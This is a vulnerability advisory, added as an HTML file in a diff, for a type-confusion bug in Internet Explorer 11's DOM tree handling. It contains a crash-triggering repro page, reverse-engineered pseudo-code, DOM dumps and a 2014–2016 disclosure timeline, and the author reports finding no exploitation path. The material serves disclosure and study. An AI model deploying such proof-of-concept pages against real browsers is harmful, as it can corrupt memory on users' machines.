@@ -1,0 +1,175 @@
+<!--
+Source: http://blog.skylined.nl/20161124001.html
+
+Synopsis
+
+A specially crafted web-page can cause a type confusion in HTML layout in Microsoft Internet Explorer 11. An attacker might be able to exploit this issue to execute arbitrary code.
+
+Known affected software and attack vectors
+
+Microsoft Internet Explorer 11
+
+An attacker would need to get a target user to open a specially crafted web-page. Disabling Javascript should prevent an attacker from triggering the vulnerable code path.
+
+Repro.html:
+-->
+
+<html>
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <script>
+      window.onload = function () {
+        document.get­Elements­By­Tag­Name("iframe")[0].src = "repro-iframe.html";
+      }
+    </script>
+  </head>
+  <body>
+    <iframe></iframe>
+  </body>
+</html>
+
+<!--
+
+Repro-iframe.html:
+
+<svg><path marker-start="url(#)"><title><q><button>
+
+Description
+
+Internally MSIE uses various lists of linked CTree­Pos objects to represent the DOM tree. For HTML/SVG elements a CTree­Node element is created, which embeds two CTree­Pos instances: one that contains information about the first child of the element and one that indicates the next sibling or parent of the element. For text nodes an object containing only one CTree­Pos is created, as such nodes never have any children. CTree­Pos instances have various flags set. This includes a flag that indicates if they are the first (f­TPBegin) or second (f­TPEnd) CTree­Pos instance for an element, or the only instance for a test node (f­TPText).
+
+The CTree­Pos::Branch method of an CTree­Pos instance embedded in a CTree­Node can be used to calculate a pointer to the CTree­Node. It determines if the CTree­Pos instance is the first or second in the CTree­Node by looking at the f­TPBegin flag and subtract the offset of this CTree­Pos object in a CTree­Node object to calculate the address of the later. This method assumes that the CTree­Pos instance is part of a CTree­Node and not a Text­Node. It will yield invalid results when called on the later. In a Text­Node, the CTree­Pos does not have the f­TPBegin flag set, so the code assumes this is the second CTree­Pos instance in a CTree­Node object and subtracts 0x24 from its address to calculate the address of the CTree­Node. Since the CTree­Pos instance is the first element in a Text­Node, the returned address will be 0x24 bytes before the Text­Node, pointing to memory that is not part of the object.
+
+Note that this behavior is very similar to another issue I found around the same time, in that that issues also caused the code to access memory 0x24 bytes before the start of a memory region containing an object. Looking back I believe that both issues may have had the same root cause and were fixed at the same time.
+
+The CGenerated­Content::Has­Generated­SVGMarker method walks the DOM using one of the CTree­Pos linked lists. It looks for any descendant node of an element that has a CTree­Pos instance with a specific flag set. If found, the CTree­Pos::Branch method is called to find the related CTree­Node, without checking if the CTree­Pos is indeed part of a CTree­Node. If a certain flag is set on this CTree­Node, it returns true. Otherwise it continues scanning. If nothing is found, it returns false.
+
+The repro creates a situation where the CGenerated­Content::Has­Generated­SVGMarker method is called on an SVG path element which has a Text­Node instance as a descendant with the right flags set to cause it to call CTree­Pos::Branch on this Text­Node. This leads to type confusion/a bad cast where a pointer that points before a Text­Node is used as a pointer to a CTree­Node.
+
+Reversed code
+
+While reversing the relevant parts, I created the following pseudo-code to illustrate the issue:
+
+enum e­Tree­Pos­Flags {
+  f­TPBegin =           0x01, // if set, this is a markup node
+  f­TPEnd =             0x02, // if set, this is a markup node
+  f­TPText =            0x04, // if set, this is a markup node
+  f­TPPointer =         0x08, // if set, this is not a markup node
+  f­TPType­Mask =        0x0f
+  f­TPLeft­Child =       0x10,
+  f­TPLast­Child =       0x20, // po­Next­Sibling­Or­Parent => f­TPLast­Child ? parent : sibling
+  f­TPData2Pos =        0x40, // valid if f­TPPointer is set
+  f­TPData­Pos =         0x80,
+  f­TPUnknown­Flag100 = 0x100, // if set, this is not a markup node
+}
+struct CTree­Pos {
+  /*offs size*/                                             // THE BELOW ARE BEST GUESSES BASED ON INADEQUATE INFORMATION!!
+  /*0000 0004*/ e­Tree­Pos­Type  f­Flags00;                     
+  /*0004 0004*/ UINT          u­Chars­Count04;                // Seems to be counting some chars - not sure what exactly
+  /*0008 0004*/ CTree­Pos*     po­First­Child;                 // can be NULL if no children exist.
+  /*000C 0004*/ CTree­Pos*     po­Next­Sibling­Or­Parent;        // f­Flags00 & f­TPLast­Child ? parent end tag : sibling start tag
+  /*0010 0004*/ CTree­Pos*     po­Thread­Left10;               // f­Flags00 & f­TPBegin ? previous sibling or parent : last child or start tag
+  /*0014 0004*/ CTree­Pos*     po­Thread­Right14;              // f­Flags00 & f­TPBegin ? first child or end tag : 
+                                                            
+  /*0018 0004*/ flags  (0x10 = something with CDATA         
+  /*0028 0004*/                                             
+}                                                           
+
+struct CTree­Node {
+  /*offs size*/                                             // THE BELOW ARE BEST GUESSES BASED ON INADEQUATE INFORMATION!!
+  /*0000 0004*/ CElement*     po­Element00;                  
+  /*0004 0004*/ CTree­Node*    po­Parent04;                   
+  /*0008 0004*/ DWORD         dw­Unknown08;                  // flags?
+  /*000C 0018*/ CTree­Pos      o­Tree­Pos­Begin0C;              // represents the position in the document immediately before the start tag
+  /*0024 0018*/ CTree­Pos      o­Tree­Pos­End24;                // represents the position in the document immediately after the end tag
+  /*003C ????*/ Unknown
+}
+struct Text­Node { // I did not figure out what this is called in MSIE
+  /*0000 0018*/ CTree­Pos      o­Tree­Pos­End00;                // represents the position in the document immediately after the node.
+  /*0018 0014*/ Unknown
+}
+
+CTree­Node* CTree­Pos::Branch() {
+  // Given a pointer to a CTree­Pos instance in a CTree­Node instance, calculate a pointer to the CTree­Node instance.
+  // The CTree­Pos instance must be either the o­Tree­Pos­Begin0C (o­Tree­Pos­Begin0C->f­Flags00 & f­TPBegin != 0) or the
+  // o­Tree­Pos­End24 (o­Tree­Pos­End24->f­Flags00 & f­TPEnd != 0).
+  BOOL b­Is­Tree­Pos­Begin0C = this->f­Flags00 & f­TPBegin;
+  INT u­Offset = offsetof(CTree­Node, b­Is­Tree­Pos­Begin0C ? o­Tree­Pos­Begin0C : o­Tree­Pos­End24);
+  return (CTree­Node*)((BYTE*)this - u­Offset);
+}
+
+BOOL CGenerated­Content::Has­Generated­SVGMarker() {
+  for (
+    CTree­Pos* po­Current­Tree­Pos = this->o­Tree­Pos­Begin0C.po­Thread­Right14,
+      CTree­Pos* po­End­Tree­Pos = &(this->o­Tree­Pos­End24);
+    po­Current­Tree­Pos != po­End­Tree­Pos;
+    po­Current­Tree­Pos = po­Current­Tree­Pos->po­Thread­Right14
+  ) {
+    if (po­Current­Tree­Pos->f­Flags00 & f­TPUnknown­Flag100) {
+      // Calling Branch is only valid in the context of CTree­Pos embedded in a CTree­Node, so the code should check for
+      // the presence of f­TPBegin or f­TPEnd in f­Flags00 before doing so. This line of code may fix the issue:
+      // if (po­Current­Tree­Pos->f­Flags00 & (f­TPBegin | f­TPEnd) == 0) continue;
+      CTree­Node* po­Tree­Node = po­Current­Tree­Pos->Branch();
+      if (po­Tree­Node && po­Tree­Node->dw64 == 20) {
+          return 1
+      }
+    }
+  }
+  return 0
+}
+
+
+DOM Tree
+
+If you replace the <q> tag with an <a> tag in the repro, or insert a <script> tag before the <svg> tag, the repro does not trigger an access violation. At that point it is possible to use document.document­Element.outer­HTML as well as recursively walk document.document­Element.child­Nodes to get an idea of what the DOM tree looks like around the time of the crash.
+
+document.document­Element.outer­HTML:
+
+<html>
+  <head>
+  </head>
+  <body>
+    <svg xmlns="http://www.w3.org/2000/svg">
+      <path marker-start="url("#")">
+        <title>
+          <q>
+            <button>                    // no closing tag.
+            <script>                    // script is a sibling of button
+              #text                     // snipped
+            </script>
+          </q>
+        </title>                        // Things get really weird here:
+        </title>
+      </path>                           // all svg close tags are doubled!?
+      </path>
+    </svg>                              // Not sure what this means.
+    </svg>
+  </body>
+</html>
+
+
+Walking document.document­Element.child­Nodes:
+
+<html>
+  <head>
+  <body>
+    <svg>                               // I did not look at attributes
+      <path>                            // ^^^ same here
+        <title>
+          <q>
+            <button>
+              <script>                  // script is a child of button
+                #text                   // snipped
+
+Exploit
+
+I did not find any code path that could lead to exploitation. However, I did not do a thorough step through of the code to find out if and how I might control execution flow upwards in the stack. Also, it appears trivial to have MSIE survive the initial crash by massaging the heap. It might be possible that other methods are affected by a similar issue and that further DOM manipulations can be used to trigger a more interesting code path.
+
+Time-line
+
+July 2014: This vulnerability was found through fuzzing.
+September 2014: This vulnerability was submitted to ZDI.
+September 2014: This vulnerability appears to have been fixed.
+October 2014: This vulnerability was rejected by ZDI.
+November 2016: Details of this issue are released.
+-->
